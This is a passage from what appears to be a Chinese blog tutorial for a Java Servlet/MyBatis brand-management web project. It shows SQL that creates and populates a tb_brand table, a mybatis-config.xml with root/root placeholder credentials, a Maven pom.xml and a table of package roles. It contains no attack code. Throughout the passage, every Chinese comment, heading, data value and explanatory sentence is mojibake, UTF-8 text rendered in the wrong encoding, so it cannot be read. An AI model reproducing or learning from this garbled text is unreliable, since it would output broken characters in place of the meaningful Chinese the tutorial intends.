class="hljs-keyword">exists</span> tb_brand;<span class="hljs-comment">-- åˆ›å»ºtb_brandè¡¨</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_brand (    <span class="hljs-comment">-- id ä¸»é”®</span>    id           <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key auto_increment,    <span class="hljs-comment">-- å“ç‰Œåç§°</span>    brand_name   <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),    <span class="hljs-comment">-- ä¼ä¸šåç§°</span>    company_name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),    <span class="hljs-comment">-- æ’åºå­—æ®µ</span>    ordered      <span class="hljs-type">int</span>,    <span class="hljs-comment">-- æè¿°ä¿¡æ¯</span>    description  <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>),    <span class="hljs-comment">-- çŠ¶æ€ï¼š0ï¼šç¦ç”¨  1ï¼šå¯ç”¨</span>    status       <span class="hljs-type">int</span>);<span class="hljs-comment">-- æ·»åŠ æ•°æ®</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> tb_brand (brand_name, company_name, ordered, description, status)<span class="hljs-keyword">values</span>        (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ &#x27;</span>, <span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;å¥½åƒä¸ä¸Šç«&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ &#x27;</span>, <span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;å¥½åƒä¸ä¸Šç«&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ &#x27;</span>, <span class="hljs-string">&#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;å¥½åƒä¸ä¸Šç«&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;åä¸º&#x27;</span>, <span class="hljs-string">&#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;ä¸‡ç‰©äº’è”&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;å°ç±³&#x27;</span>, <span class="hljs-string">&#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;æ ¼åŠ›&#x27;</span>, <span class="hljs-string">&#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´&#x27;</span>, <span class="hljs-string">&#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;ä¹°ä¹°ä¹°&#x27;</span>, <span class="hljs-number">1</span>),       (<span class="hljs-string">&#x27;è…¾è®¯&#x27;</span>, <span class="hljs-string">&#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;ç©ç©ç©&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>, <span class="hljs-string">&#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;æœæœæœ&#x27;</span>, <span class="hljs-number">0</span>),       (<span class="hljs-string">&#x27;äº¬ä¸œ&#x27;</span>, <span class="hljs-string">&#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;å°±æ˜¯å¿«&#x27;</span>, <span class="hljs-number">1</span>);</code></pre><h4 id="2-3-é…ç½®ä¿¡æ¯"><a href="#2-3-é…ç½®ä¿¡æ¯" class="headerlink" title="2.3 é…ç½®ä¿¡æ¯"></a>2.3 é…ç½®ä¿¡æ¯</h4><h5 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h5><p>å°†mybatisçš„é…ç½®æ–‡ä»¶<code>mybatis-config.xml</code>copyåˆ°<code>src/main/resource</code>ç›®å½•ä¸‹</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.pojo&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span>                               <span class="hljs-comment">&lt;!-- é…ç½®æ•°æ®å javastudy ç”¨æˆ·åå’Œå¯†ç --&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql:///javastudy?useSSL=false&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>       <span class="hljs-comment">&lt;!--æ‰«æmapper è¿™é‡Œæ ¹æ®é¡¹ç›®çš„mapperç›®å½•é…ç½®--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.mapper&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre><h5 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h5><p><code>pom.xml</code></p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>brand-case<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-comment">&lt;!--webé¡¹ç›®å°†æ‰“åŒ…æˆwaræ ¼å¼ </span><span class="hljs-comment">æ™®é€šé¡¹ç›®åˆ™ä¸ºjar </span><span class="hljs-comment">--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-comment">&lt;!--Servlet--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--MyBatisä¾èµ–--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--MySQL--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.34<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-comment">&lt;!--fastjson jsonè½¬objectæ—¶ç”¨åˆ°--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>                <span class="hljs-comment">&lt;!-- è¿™é‡Œå¯ä»¥é…ç½®tomcatçš„portå’Œæ ¹è·¯å¾„ --&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre><h5 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h5><p>åœ¨<code>/scr/main/java</code>ä¸­æ–°å»º<code>pojo</code>ã€<code>mapper</code>ã€<code>service</code>ã€<code>web</code>ã€<code>util</code>ç­‰åŒ…</p><table><thead><tr><th>åŒ…å</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>pojo</td><td>å­˜æ”¾å®ä½“ç±»ï¼Œæ¯”å¦‚Brandã€Userç­‰</td></tr><tr><td>mapper</td><td>å­˜æ”¾å¯¹åº”çš„Mapperæ¥å£ æ¯”å¦‚BrandMapper</td></tr><tr><td>service</td><td>å­˜æ”¾æä¾›æœåŠ¡çš„ç±»BrandService</td></tr><tr><td>web</td><td>å­˜æ”¾webå±‚ä½¿ç”¨åˆ°çš„Servlet</td></tr><tr><td>util</td><td>å­˜æ”¾å·¥å…·åŒ…</td></tr></tbody></table><p>åˆ›å»º<code>src/main/resources/com/itheima/mapper/</code>ç›®å½•ï¼Œè¯¥ç›®å½•å­˜æ”¾<code>BrandMapper.xml</code></p><p>è¯¥æ–‡ä»¶åœ¨tomcatå¯åŠ¨åè‡ªåŠ¨ä¿å­˜åˆ°<code>src/main/java/com/itheima/mapper/BrandMapper.xml</code></p><h2 id="å‰ç«¯é¡µé¢"><a href="#å‰ç«¯é¡µé¢" class="headerlink" title="å‰ç«¯é¡µé¢"></a>å‰ç«¯é¡µé¢</h2><p>ç™»å½•å’Œæ³¨å†Œé¡µé¢ä½¿ç”¨htmlå’Œjavascriptè®¾è®¡</p><p>å±•ç¤ºé¡µé¢ä½¿ç”¨Vueå’Œelement-uiè®¾è®¡å‡ºä¸€ä¸ªç®€å•çš„å±•ç¤ºé¡µé¢</p><h2 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h2><h3 id="1-æŸ¥è¯¢æ‰€æœ‰"><a 